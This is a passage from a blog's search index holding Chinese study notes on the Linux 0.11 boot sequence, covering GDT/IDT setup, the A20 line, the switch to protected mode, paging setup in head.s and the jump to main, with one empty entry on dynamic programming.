<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>你管这破玩意儿叫操作系统源码(三)</title>
    <link href="/2023/04/03/OperatingSystem/Operating-system-source-code-3/"/>
    <url>/2023/04/03/OperatingSystem/Operating-system-source-code-3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文为学习<ahref="https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&amp;__biz=Mzk0MjE3NDE0Ng==&amp;scene=1&amp;album_id=2123743679373688834&amp;count=3#wechat_redirect">操作系统统源码(低并发编程)</a>所作笔记，仅供学习参考，不做任何商业用途,若有侵权，请联系删除。</p></blockquote><h1 id="第九回-intel-内存管理两板斧分段与分页">第九回 | Intel内存管理两板斧：分段与分页</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499821&amp;idx=1&amp;sn=df90a7c57607bf501b5ef535f8440d98&amp;chksm=c2c5ba80f5b233969bf591f919107e28e7be51f066821cba1ea39bf19cc0332b95b94d29467d&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">第九回| Intel 内存管理两板斧：分段与分页 (qq.com)</a></p></blockquote><p>上回head.s代码重新设置了gdt与idt。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640.png" class="" title="图片"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">jmp after_page_tables<br>...<br>after_page_tables:<br>    push 0<br>    push 0<br>    push 0<br>    push L6<br>    push _main<br>    jmp setup_paging<br>L6:<br>    jmp L6<br></code></pre></td></tr></table></figure><p>开启分页机制，并且跳转到main函数。</p><p>如何跳转到之后用 c 语言写的 main.c 里的 main函数，是个有趣的事，也包含在这段代码里。不过我们先瞧瞧这<strong>分页机制</strong>是如何开启的，也就是<strong>setup_paging</strong> 这个标签处的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asm">setup_paging:<br>    mov ecx,1024*5<br>    xor eax,eax<br>    xor edi,edi<br>    pushf<br>    cld<br>    rep stosd<br>    mov eax,_pg_dir<br>    mov [eax],pg0+7<br>    mov [eax+4],pg1+7<br>    mov [eax+8],pg2+7<br>    mov [eax+12],pg3+7<br>    mov edi,pg3+4092<br>    mov eax,00fff007h<br>    std<br>L3: stosd<br>    sub eax,00001000h<br>    jge L3<br>    popf<br>    xor eax,eax<br>    mov cr3,eax<br>    mov eax,cr0<br>    or  eax,80000000h<br>    mov cr0,eax<br>    ret<br></code></pre></td></tr></table></figure><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-16804845957623.png" class="" title="图片"><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-16804846005856.png" class="" title="图片"><p>也就是说，在没有开启分页机制时，由程序员给出的<strong>逻辑地址</strong>，需要先通过分段机制转换成物理地址。但在开启分页机制后，逻辑地址仍然要先通过分段机制进行转换，只不过转换后不再是最终的物理地址，而是<strong>线性地址</strong>，然后再通过一次分页机制转换，得到最终的物理地址。</p><p>比如我们的线性地址（已经经过了分段机制的转换）是</p><p>15M</p><p>二进制表示就是</p><p>0000000011_0100000000_000000000000</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-16804846499629.png" class="" title="图片"><p>而这一切的操作，都由计算机的一个硬件叫<strong>MMU</strong>，中文名字叫<strong>内存管理单元</strong>，有时也叫PMMU，分页内存管理单元。由这个部件来负责将虚拟地址转换为物理地址。</p><p>所以整个过程我们不用操心，作为操作系统这个软件层，只需要提供好页目录表和页表即可，这种页表方案叫做<strong>二级页表</strong>，第一级叫<strong>页目录表PDE</strong>，第二级叫<strong>页表 PTE</strong>。他们的结构如下。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048470973012.png" class="" title="图片"><p>之后再开启分页机制的开关。其实就是更改 <strong>cr0</strong>寄存器中的一位即可（31位），还记得我们开启保护模式么，也是改这个寄存器中的一位的值。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048472312215.png" class="" title="图片"><p>所以这段代码，就是帮我们把页表和页目录表在内存中写好，之后开启 cr0寄存器的分页开关，仅此而已，我们再把代码贴上来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asm">setup_paging:<br>    mov ecx,1024*5<br>    xor eax,eax<br>    xor edi,edi<br>    pushf<br>    cld<br>    rep stosd<br>    mov eax,_pg_dir<br>    mov [eax],pg0+7<br>    mov [eax+4],pg1+7<br>    mov [eax+8],pg2+7<br>    mov [eax+12],pg3+7<br>    mov edi,pg3+4092<br>    mov eax,00fff007h<br>    std<br>L3: stosd<br>    sub eax,00001000h<br>    jge L3<br>    popf<br>    xor eax,eax<br>    mov cr3,eax<br>    mov eax,cr0<br>    or  eax,80000000h<br>    mov cr0,eax<br>    ret<br></code></pre></td></tr></table></figure><p>当时 linux-0.11 认为，总共可以使用的内存不会超过<strong>16M</strong>，也即最大地址空间为 <strong>0xFFFFFF</strong>。</p><p>而按照当前的页目录表和页表这种机制，1 个页目录表最多包含 1024个页目录项（也就是 1024 个页表），1 个页表最多包含 1024 个页表项（也就是1024 个页），1 页为 4KB（因为有 12 位偏移地址），因此，16M的地址空间可以用 1 个页目录表 + 4 个页表搞定。</p><p>所以，上面这段代码就是，<strong>将页目录表放在内存地址的最开头</strong>，还记得上一讲开头让你留意的_pg_dir 这个标签吧？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">_pg_dir:<br>_startup_32:<br>    mov eax,0x10<br>    mov ds,ax<br>    ...<br></code></pre></td></tr></table></figure><p><strong>之后紧挨着这个页目录表，放置 4个页表</strong>，代码里也有这四个页表的标签项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.org 0x1000 pg0:<br>.org 0x2000 pg1:<br>.org 0x3000 pg2:<br>.org 0x4000 pg3:<br>.org 0x5000<br></code></pre></td></tr></table></figure><p>最终将页目录表和页表填写好数值，来覆盖整个 16MB的内存。随后，开启分页机制。此时内存中的页表相关的布局如下。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048506874118.png" class="" title="图片"><p>同时，如 idt 和 gdt 一样，我们也需要通过一个寄存器告诉 CPU我们把这些页表放在了哪里，就是这段代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">xor eax,eax<br>mov cr3,eax<br></code></pre></td></tr></table></figure><p>你看，我们相当于告诉 cr3 寄存器，<strong>0地址处就是页目录表，再通过页目录表可以找到所有的页表</strong>，也就相当于CPU 知道了分页机制的全貌了。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048531662621.png" class="" title="图片"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">setup_paging:<br>    ...<br>    mov eax,_pg_dir<br>    mov [eax],pg0+7<br>    mov [eax+4],pg1+7<br>    mov [eax+8],pg2+7<br>    mov [eax+12],pg3+7<br>    mov edi,pg3+4092<br>    mov eax,00fff007h<br>    std<br>L3: stosd<br>    sub eax, 1000h<br>    jpe L3<br>    ...<br></code></pre></td></tr></table></figure><p>很简单，对照刚刚的页目录表与页表结构看。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048534660624.png" class="" title="图片"><p>前五行表示，页目录表的前 4 个页目录项，分别指向 4个页表。比如页目录项中的第一项 <strong>[eax]</strong> 被赋值为<strong>pg0+7</strong>，也就是<strong>0x00001007</strong>，根据页目录项的格式，表示页表地址为<strong>0x1000</strong>，页属性为 <strong>0x07</strong>表示改页存在、用户可读写。</p><p>后面几行表示，填充 4 个页表的每一项，一共<strong>4*1024=4096</strong> 项，依次映射到内存的前 16MB 空间。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048545418027.png" class="" title="图片"><p><strong>逻辑地址</strong>：我们程序员写代码时给出的地址叫逻辑地址，其中包含段选择子和偏移地址两部分。</p><p><strong>线性地址</strong>：通过分段机制，将逻辑地址转换后的地址，叫做线性地址。而这个线性地址是有个范围的，这个范围就叫做线性地址空间，32位模式下，线性地址空间就是 4G。</p><p><strong>物理地址</strong>：就是真正在内存中的地址，它也是有范围的，叫做物理地址空间。那这个范围的大小，就取决于你的内存有多大了。</p><p><strong>虚拟地址</strong>：如果没有开启分页机制，那么线性地址就和物理地址是一一对应的，可以理解为相等。如果开启了分页机制，那么线性地址将被视为虚拟地址，这个虚拟地址将会通过分页机制的转换，最终转换成物理地址。</p><h1 id="第十回-进入main函数前的最后一跃">第十回 |进入main函数前的最后一跃</h1><p>这仍然要回到上一讲我们跳转到设置分页代码的那个地方（head.s里），这里有个骚操作帮我们跳转到 main.c。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">after_page_tables:<br>    push 0<br>    push 0<br>    push 0<br>    push L6<br>    push _main<br>    jmp setup_paging<br>...<br>setup_paging:<br>    ...<br>    ret<br></code></pre></td></tr></table></figure><p>push 指令就是<strong>压栈</strong>，五个 push指令过去后，栈会变成这个样子。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048612741230.png" class="" title="图片"><p>然后注意，setup_paging 最后一个指令是<strong>ret</strong>，也就是我们上一回讲的设置分页的代码的最后一个指令，形象地说它叫<strong>返回指令</strong>，但CPU可没有那么聪明，它并不知道该返回到哪里执行，只是很机械地<strong>把栈顶的元素值当做返回地址</strong>，跳转去那里执行。</p><p>再具体说是，把 esp 寄存器（栈顶地址）所指向的内存处的值，赋值给 eip寄存器，而 cs:eip 就是 CPU 要执行的下一条指令的地址。而此时栈顶刚好是main.c 里写的 main 函数的内存地址，是我们刚刚特意压入栈的，所以 CPU就理所应当跳过来了。</p><p>至于其他压入栈的 L6 是用作当 main函数返回时的跳转地址，但由于在操作系统层面的设计上，main是绝对不会返回的，所以也就没用了。而其他的三个压栈的 0，本意是作为 main函数的参数，但实际上似乎也没有用到，所以也不必关心。</p><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048697699733.png" class="" title="图片"><img src="/2023/04/03/OperatingSystem/Operating-system-source-code-3/640-168048698787836.png" class="" title="图片">]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>动态规划(一)</title>
    <link href="/2023/04/02/Algorithm/algorithm-11/"/>
    <url>/2023/04/02/Algorithm/algorithm-11/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>你管这破玩意儿叫操作系统源码(二)</title>
    <link href="/2023/03/03/OperatingSystem/Operating-system-source-code-2/"/>
    <url>/2023/03/03/OperatingSystem/Operating-system-source-code-2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文为学习<ahref="https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&amp;__biz=Mzk0MjE3NDE0Ng==&amp;scene=1&amp;album_id=2123743679373688834&amp;count=3#wechat_redirect">操作系统统源码(低并发编程)</a>所作笔记，仅供学习参考，不做任何商业用途,若有侵权，请联系删除。</p></blockquote><h1 id="第六回-先解决段寄存器的历史包袱问题">第六回 |先解决段寄存器的历史包袱问题</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499667&amp;idx=1&amp;sn=a7e2297f16d048794fa31cceaa183fc9&amp;chksm=c2c5853ef5b20c286df24a28013f0fc3b0336790eca4a0d069ab831f6c536c03d1398893534b&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">第六回| 先解决段寄存器的历史包袱问题 (qq.com)</a></p></blockquote><p>当前的内存布局如下，</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640.png" class="" title="图片"><p><code>0</code>地址开始处存放着操作系统的全部代码吗，也就是<code>system</code>模块，<code>0x90000</code>位置处往后的几十个字节存放着一些设备的信息，方便以后使用。</p><table><thead><tr class="header"><th>内存地址</th><th>长度(字节)</th><th>名称</th></tr></thead><tbody><tr class="odd"><td>0x90000</td><td>2</td><td>光标位置</td></tr><tr class="even"><td>0x90002</td><td>2</td><td>扩展内存数</td></tr><tr class="odd"><td>0x90004</td><td>2</td><td>显示页面</td></tr><tr class="even"><td>0x90006</td><td>1</td><td>显示模式</td></tr><tr class="odd"><td>0x90007</td><td>1</td><td>字符列数</td></tr><tr class="even"><td>0x90008</td><td>2</td><td>未知</td></tr><tr class="odd"><td>0x9000A</td><td>1</td><td>显示内存</td></tr><tr class="even"><td>0x9000B</td><td>1</td><td>显示状态</td></tr><tr class="odd"><td>0x9000C</td><td>2</td><td>显卡特性参数</td></tr><tr class="even"><td>0x9000E</td><td>1</td><td>屏幕行数</td></tr><tr class="odd"><td>0x9000F</td><td>1</td><td>屏幕列数</td></tr><tr class="even"><td>0x90080</td><td>16</td><td>硬盘1参数表</td></tr><tr class="odd"><td>0x90090</td><td>16</td><td>硬盘2参数表</td></tr><tr class="even"><td>0x901FC</td><td>2</td><td>根设备号</td></tr></tbody></table><p>接下来就要进行真正的第一项大工程了，那就是<strong>模式的转换</strong>，需要从现在的<strong>16位的实模式</strong>转变为之后的<strong>32位的保护模式</strong>。</p><p>这是 <strong>x86 的历史包袱</strong>问题，现在的 CPU 几乎都是支持 32位模式甚至 64 位模式了，很少有还仅仅停留在 16 位的实模式下的CPU。所以我们要为了这个历史包袱，<strong>写一段模式转换的代码</strong>，如果Intel CPU被重新设计而不用考虑兼容性，那么今天的代码将会减少很多甚至不复存在。</p><p>并不直接介绍实模式和保护模式的区别，而是跟着代码慢慢品味。</p><p><code>setup.s</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">lidt  idt_48      ; load idt with 0,0<br>lgdt  gdt_48      ; load gdt with whatever appropriate<br><br>idt_48:<br>    .word   0     ; idt limit=0<br>    .word   0,0   ; idt base=0L<br></code></pre></td></tr></table></figure><p>CPU计算物理地址的方式，段基址左移四位，再加上偏移地址。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-16778300823713.png" class="" title="图片"><p>当 CPU切换到<strong>保护模式</strong>后，同样的代码，内存地址的计算方式不一样。</p><p>刚刚那个 ds寄存器里存储的值，在实模式下叫做<strong>段基址</strong>，在保护模式下叫<strong>段选择子</strong>。段选择子里存储着<strong>段描述符</strong>的索引。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-16778301328306.png" class="" title="图片"><p>通过段描述符索引，可以从<strong>全局描述符表 gdt</strong>中找到一个段描述符，段描述符里存储着段基址。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-16778301625849.png" class="" title="图片"><p>段基址取出来，再和偏移地址相加，就得到了物理地址，整个过程如下。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167783020431112.png" class="" title="图片"><p><strong>段寄存器（比如ds、ss、cs）里存储的是段选择子，段选择子去全局描述符表中寻找段描述符，从中取出段基址</strong>。</p><p><strong>全局描述符表（gdt）</strong>长什么样？它在哪？怎么让 CPU知道它在哪？</p><p>操作系统把这个位置信息存储在一个叫 <strong>gdtr</strong>的寄存器中。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167783025733915.png" class="" title="图片"><p>怎么存呢？就是刚刚那条指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">lgdt    gdt_48<br></code></pre></td></tr></table></figure><p>其中 <strong>lgdt</strong>就表示把<strong>后面的值（gdt_48）</strong>放在 <strong>gdtr</strong>寄存器中，gdt_48 标签，我们看看它长什么样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">gdt_48:<br>    .word   0x800       ; gdt limit=2048, 256 GDT entries<br>    .word   512+gdt,0x9 ; gdt base = 0X9xxxx<br></code></pre></td></tr></table></figure><p>可以看到这个标签位置处表示一个 48 位的数据，其中高 32位存储着的正是全局描述符表 gdt 的内存地址</p><p><strong>0x90200 + gdt</strong></p><p><strong>gdt</strong> 是个标签，表示在本文件内的偏移量，而本文件是<strong>setup.s</strong>，编译后是放在 <strong>0x90200</strong>这个内存地址的，还记得吧？所以要加上 0x90200 这个值。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167783051575618.png" class="" title="图片"><p>那 gdt 这个标签处，就是全局描述符表在内存中的真正数据了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">gdt:<br>    .word   0,0,0,0     ; dummy<br><br>    .word   0x07FF      ; 8Mb - limit=2047 (2048*4096=8Mb)<br>    .word   0x0000      ; base address=0<br>    .word   0x9A00      ; code read/exec<br>    .word   0x00C0      ; granularity=4096, 386<br><br>    .word   0x07FF      ; 8Mb - limit=2047 (2048*4096=8Mb)<br>    .word   0x0000      ; base address=0<br>    .word   0x9200      ; data read/write<br>    .word   0x00C0      ; granularity=4096, 386<br></code></pre></td></tr></table></figure><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167783075125121.png" class="" title="图片"><p>可以看出目前全局描述符表有三个段描述符，第一个为<strong>空</strong>，第二个是<strong>代码段描述符（type=code）</strong>，第三个是<strong>数据段描述符（type=data）</strong>.</p><p>第二个和第三个段描述符的段基址都是0，也就是之后在逻辑地址转换物理地址的时候，通过段选择子查找到无论是代码段还是数据段，取出的段基址都是0，那么物理地址将直接等于程序员给出的逻辑地址（准确说是逻辑地址中的偏移地址）。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167783090688524.png" class="" title="图片"><p>接下来我们看看目前的内存布局，还是别管比例。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167783092561327.png" class="" title="图片"><p>这里我把 <strong>idtr</strong>寄存器也画出来了，这个是<strong>中断描述符表</strong>，其原理和全局描述符表一样。全局描述符表是让段选择子去里面寻找段描述符用的，而中断描述符表是用来在发生中断时，CPU拿着中断号去中断描述符表中寻找中断处理程序的地址，找到后就跳到相应的中断程序中去执行，具体我们后面遇到了再说。</p><p>好了，今天我们就讲，操作系统设置了个<strong>全局描述符表gdt</strong>，为后面切换到<strong>保护模式</strong>后，能去那里寻找到段描述符，然后拼凑成最终的物理地址，就这个作用。当然，还有很多段描述符，作用不仅仅是转换成最终的物理地址，不过这是后话了。</p><h1 id="第七回-六行代码就进入了保护模式">第七回 |六行代码就进入了保护模式</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499699&amp;idx=1&amp;sn=000d83798b0158dbdf48d76e49d3ff96&amp;chksm=c2c5851ef5b20c08bc641d4b118db78a3af5a4f90a057d1ce9f9b68f04b529124f466c743bc5&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">第七回| 六行代码就进入了保护模式 (qq.com)</a></p></blockquote><p>操作系统设置了个全局描述符表 gdt。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640.png" class="" title="图片"><p>为后面切换到保护模式后，能去那里寻找到段描述符，然后拼凑成最终的物理地址。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-16779163392343.png" class="" title="图片"><p>而此时，我们的内存布局变成了这个样子。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167800120362013.png" class="" title="图片"><p><code>setup.s</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov al,#0xD1        ; command write<br>out #0x64,al<br>mov al,#0xDF        ; A20 on<br>out #0x60,al<br></code></pre></td></tr></table></figure><p>简单理解，这一步就是为了突破地址信号线 20 位的宽度，变成 32位可用。这是由于 8086 CPU 只有 20 位的地址线，所以如果程序给出 21位的内存地址数据，那多出的一位就被忽略了，比如如果经过计算得出一个内存地址为</p><p>1 0000 00000000 00000000</p><p>那实际上内存地址相当于 0，因为高位的那个 1 被忽略了，地方不够。</p><p>当 CPU 到了 32位时代之后，由于要考虑<strong>兼容性</strong>，还必须保持一个只能用 20位地址线的模式，所以如果你不手动开启的话，即使地址线已经有 32位了，仍然会限制只能使用其中的 20 位。</p><p>好了，接下来的一步，就是真正切换模式的一步了，从代码上看就两行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov ax,#0x0001  ; protected mode (PE) bit<br>lmsw ax      ; This is it;<br>jmpi 0,8     ; jmp offset 0 of segment 8 (cs)<br></code></pre></td></tr></table></figure><p>前两行，将 cr0 这个寄存器的位 0 置1，模式就从实模式切换到保护模式了。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167800142791216.png" class="" title="图片"><p><strong>所以真正的模式切换十分简单，重要的是之前做的准备工作。</strong></p><p>再往后，又是一个段间跳转指令 <strong>jmpi</strong>，后面的 8 表示cs（代码段寄存器）的值，0表示偏移地址。请注意，此时已经是保护模式了，之前也说过，保护模式下内存寻址方式变了，段寄存器里的值被当做段选择子。</p><p>回顾下段选择子的模样。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167800146248819.png" class="" title="图片"><p>对照上面段选择子的结构，可以知道<strong>描述符索引值是1</strong>，也就是要去<strong>全局描述符表（gdt）</strong>中找第一项段描述符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">gdt:<br>    .word   0,0,0,0     ; dummy<br><br>    .word   0x07FF      ; 8Mb - limit=2047 (2048*4096=8Mb)<br>    .word   0x0000      ; base address=0<br>    .word   0x9A00      ; code read/exec<br>    .word   0x00C0      ; granularity=4096, 386<br><br>    .word   0x07FF      ; 8Mb - limit=2047 (2048*4096=8Mb)<br>    .word   0x0000      ; base address=0<br>    .word   0x9200      ; data read/write<br>    .word   0x00C0      ; granularity=4096, 386<br></code></pre></td></tr></table></figure><p>我们说了，第 0项是空值，第一项被表示为<strong>代码段描述符</strong>，是个可读可执行的段，第二项为<strong>数据段描述符</strong>，是个可读可写段，不过他们的段基址都是0。</p><p>所以，这里取的就是这个代码段描述符，<strong>段基址是0</strong>，偏移也是 0，那加一块就还是 0咯，所以最终这个跳转指令，就是跳转到内存地址的 0 地址处，开始执行。</p><p>零地址处是什么呢？还是回顾之前的内存布局图。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167800162235322.png" class="" title="图片"><p>就是操作系统全部代码的 system 这个大模块，system 模块怎么生成的呢？由Makefile 文件可知，是由 head.s 和 main.c以及其余各模块的操作系统代码合并来的，可以理解为操作系统的全部核心代码编译后的结果。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">tools/system: boot/head.o init/main.o \</span><br>    <span class="hljs-variable">$(ARCHIVES)</span> <span class="hljs-variable">$(DRIVERS)</span> <span class="hljs-variable">$(MATH)</span> <span class="hljs-variable">$(LIBS)</span><br>    <span class="hljs-variable">$(LD)</span> <span class="hljs-variable">$(LDFLAGS)</span> boot/head.o init/main.o \<br>    <span class="hljs-variable">$(ARCHIVES)</span> \<br>    <span class="hljs-variable">$(DRIVERS)</span> \<br>    <span class="hljs-variable">$(MATH)</span> \<br>    <span class="hljs-variable">$(LIBS)</span> \<br>    -o tools/system &gt; System.map<br></code></pre></td></tr></table></figure><h1 id="第八回-烦死了又要重新设置一边idt和gdt">第八回 |烦死了又要重新设置一边idt和gdt</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499734&amp;idx=1&amp;sn=89045b51e41d2e74754f5475d25d7b54&amp;chksm=c2c5857bf5b20c6d1698df2abd0e1eea601e83612ee6af58dc8eb79f93c751f73d7c62e565ce&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">第八回| 烦死了又要重新设置一遍 idt 和 gdt (qq.com)</a></p></blockquote><p>上回书咱们说到，CPU进入了32位保护模式。</p><p>首先配置了全局描述符表<code>gdt</code>和中断描述符表<code>idt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">lidt  idt_48<br>lgdt  gdt_48<br></code></pre></td></tr></table></figure><p>然后打开了A20地址线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov al,#0xD1        ; command write<br>out #0x64,al<br>mov al,#0xDF        ; A20 on<br>out #0x60,al<br></code></pre></td></tr></table></figure><p>然后更改cr0寄存器开启保护模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov ax,#0x0001<br>lmsw ax<br></code></pre></td></tr></table></figure><p>最后，一个干脆利落的跳转指令，跳到了内存地址 0 处开始执行代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">jmpi 0,8<br></code></pre></td></tr></table></figure><p>0 位置处存储着操作系统全部核心代码，是由 head.s 和 main.c以及后面的无数源代码文件编译并链接在一起而成的 system 模块。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640.png" class="" title="图片"><p>那接下来，我们就品品，正式进入 c 语言写的 main.c 之前的<strong>head.s</strong> 究竟写了点啥？</p><p>head.s 文件很短，我们一点点品。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">_pg_dir:<br>_startup_32:<br>    mov eax,0x10<br>    mov ds,ax<br>    mov es,ax<br>    mov fs,ax<br>    mov gs,ax<br>    lss esp,_stack_start<br></code></pre></td></tr></table></figure><p>**_pg_dit，表示页目录**，之后在设置分页机制时，页目录会存放在这里，也会覆盖这里的代码。</p><p>再往下连续五个 <strong>mov</strong> 操作，分别给 